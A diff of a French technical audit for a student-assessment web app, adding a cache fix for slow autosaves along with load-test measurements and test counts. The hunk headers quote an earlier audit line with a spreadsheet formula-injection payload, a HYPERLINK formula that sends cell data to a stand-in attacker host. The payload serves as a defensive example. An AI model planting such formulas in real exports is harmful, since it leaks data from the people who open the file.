@@ -176,7 +176,7 @@ Un étudiant nommé par exemple `=HYPERLINK("http://evil.example/steal?x="&A2,"c
 **Constats, par gravité :**
 1. **Limiteurs par IP inadaptés aux classes** (`joinLimiter` 15/15 min, `attemptActionLimiter` 120/5 min par IP) — **corrigé, voir ci-dessous**.
 2. **Soumission simultanée** : ≈ 16 requêtes SQL + une transaction par soumission ; le pool `pg` par défaut (10 connexions) est saturé → Prisma `P2028 Unable to start a transaction in the given time` → erreur 500. **Corrigé, voir ci-dessous.**
-3. **9 à 16 requêtes SQL séquentielles par action** (une par relation chargée, cache invalidé à chaque écriture) → très sensible à la distance Render↔Neon. Pistes : mettre à jour le cache en place (mesuré : autosave ×75 plus rapide à 20 ms), `relationLoadStrategy: "join"` (nécessite `previewFeatures = ["relationJoins"]` + régénération du client, non testé), aligner les régions Render/Neon. **Ouvert.**
+3. **9 à 16 requêtes SQL séquentielles par action** (une par relation chargée, cache invalidé à chaque écriture) → très sensible à la distance Render↔Neon. **Corrigé en grande partie, voir ci-dessous** ; restent : `relationLoadStrategy: "join"` (nécessite `previewFeatures = ["relationJoins"]` + régénération du client, non testé) pour diviser encore le coût d'un rechargement à froid, et l'alignement des régions Render/Neon (prioritaire).
 4. **`trust proxy = 1` non vérifié sur Render** (derrière Cloudflare) : si `req.ip` est l'IP du proxy, tous les limiteurs par IP (login 10/15 min, inscription 5/h, IA, PDF, entrée) partagent un seul compteur pour tous les utilisateurs. À vérifier en loggant `req.ip` / `X-Forwarded-For` sur un vrai appel. **Ouvert.**
 5. **Non mesuré, lu dans le code :** dépôts de fichiers lus en entier en mémoire (OOM possible sur 512 Mo avec beaucoup de dépôts simultanés) ; emails de résultats envoyés pendant la soumission (quota Resend gratuit, expéditeur `onboarding@resend.dev` limité à l'adresse du compte tant qu'aucun domaine n'est vérifié) ; `GET /api/evaluations` renvoie toutes les tentatives de toutes les évaluations (149 Ko pour 250 tentatives d'une seule évaluation) ; CPU ≈ 6–18 ms/requête, donc plafond bas sur une petite instance Render.
 
@@ -208,6 +208,28 @@ Un étudiant nommé par exemple `=HYPERLINK("http://evil.example/steal?x="&A2,"c
 
 - **Reste lent à 60 ms :** l'autosave (9–11 requêtes SQL séquentielles par sauvegarde, cache vidé à chaque écriture, voir n°3) — médiane 5,3 s en charge lourde à 60 ms. La latence Render↔Neon est le facteur dominant : à aligner en priorité.
 - **Tests :** `attempt.service.test.js` mis à jour (regroupement des écritures, non-écrasement des notes enseignant, une seule lecture de contexte au blocage) + 7 tests `submitAttempt` (une transaction, révélation immédiate d'un QCM sans attendre l'email, idempotence, expiration, 404, 403, cache) ; suite unitaire `148 passed`, intégration `16 passed`, lint et build frontend OK.
+
+**Correctif appliqué — sauvegardes lentes (n°3, 2026-09-26) :**
+- **Cause :** chaque sauvegarde vidait le cache de la tentative ([attemptCache.js](backend/src/lib/attemptCache.js)), donc la suivante rechargeait tout (8 `SELECT` séquentiels : tentative, réponses, élève, publication, évaluation, questions, choix, critères) avant d'écrire sa réponse ; la jointure de l'élève (`/join`) relisait aussi en base une tentative qu'elle venait de créer (≈ 18 requêtes) sans jamais alimenter le cache.
+- **Cache mis à jour en place** ([attempt.service.js](backend/src/services/attempt.service.js)) : `saveTextAnswer`, `saveFileAnswer` et `registerExit` appliquent leur écriture à l'entrée en cache (`attemptCache.update`) au lieu de l'invalider. Garde-fous :
+  - l'**expiration n'est pas repoussée** (TTL 10 s inchangé) : sinon un élève qui sauvegarde sans arrêt ne verrait jamais une évaluation désactivée par l'enseignant entre-temps ; le délai de prise en compte reste ≤ 10 s ;
+  - la mise à jour s'applique à la **valeur courante** du cache, pas à une copie lue plus tôt : deux sauvegardes simultanées (ex. un clic QCM pendant qu'un texte s'enregistre) **s'additionnent** au lieu de s'écraser ;
+  - la réponse mise en cache garde la même forme qu'un chargement en base (`criterionScores`) ;
+  - entrée absente ou expirée : aucune écriture en cache, la lecture suivante recharge depuis la base.
+- **`/join`** : la tentative créée est composée en mémoire (publication et élève déjà chargés) puis mise en cache — ≈ 8 requêtes au lieu de ≈ 18, et la première sauvegarde trouve le cache chaud. Les bonnes réponses restent absentes de la charge utile élève (test dédié).
+- **Fuite mémoire corrigée au passage :** les entrées du cache n'étaient supprimées que si on les relisait après expiration ; un balayage toutes les 60 s (`sweep`, timer `unref`) évite l'accumulation de tentatives terminées jusqu'au prochain redémarrage.
+- **Mesuré (250 élèves, charge lourde = 1 sauvegarde / 3 s pendant 90 s, puis soumission simultanée ; limiteurs actifs ; latence de base simulée) :**
+
+| Latence par requête SQL | Sauvegarde (médiane) | Soumission (médiane) | Requêtes SQL / requête |
+|---|---|---|---|
+| 20 ms | 912 ms → **36 ms** | 3,9 s → **0,43 s** | 10,5 → **3,6** |
+| 60 ms | 5,3 s → **82 ms** | 10,4 s → **2,9 s** | 10,9 → **3,6** |
+| 100 ms | *(non mesuré avant)* 942 ms (p95 5,8 s) | 6,4 s | 4,1 |
+| 60 ms, charge réaliste (1 réponse / 15 s) | 420 ms → **413 ms** (p95 3,2 s → **0,48 s**) | 4,4 s → **0,49 s** | — |
+
+  0 échec dans tous les scénarios, et la charge offerte est désormais entièrement traitée (à 60 ms, 8 509 sauvegardes terminées contre 3 456 avant) ; CPU serveur 7,2 → 4,2 ms/requête, mémoire ≈ 180–220 Mo.
+- **Limites restantes :** en charge réaliste (une réponse toutes les ~15 s), le TTL de 10 s a presque toujours expiré entre deux sauvegardes d'un même élève : chaque sauvegarde recharge alors à froid (≈ 8 requêtes, ≈ 0,4 s à 60 ms) — acceptable, mais un TTL plus long ou un cache séparé du contenu de l'évaluation (partagé entre élèves) réduirait la charge base ; à 100 ms de latence en charge lourde, le pool de 20 connexions se sature (les rechargements à froid des 250 élèves) : aligner les régions Render/Neon reste le levier n°1.
+- **Tests :** 10 tests ajoutés (cache mis à jour sans rechargement, expiration non repoussée, fusion de deux sauvegardes simultanées, forme `criterionScores`, `/join` sans relecture + cache + pas de fuite des bonnes réponses, 5 tests unitaires de `attemptCache`) ; suite unitaire `158 passed`, intégration `16 passed`.
 
 **Vérification (limiteurs) :** 5 nouveaux tests ([attempt.routes.test.js](backend/src/routes/__tests__/attempt.routes.test.js)) : 250 élèves derrière une même IP passent sans 429 (entrée + lecture + sauvegarde), limite par tentative sans effet sur les autres, plafond d'entrée configurable, blocage du sondage 404, limite de dépôts. Suite unitaire `139 passed`, intégration `16 passed`. Simulation A rejouée avec les limiteurs actifs : **250/250 entrent, 250/250 soumettent, 0 refus 429** (avant : 15/250 et 0).
 
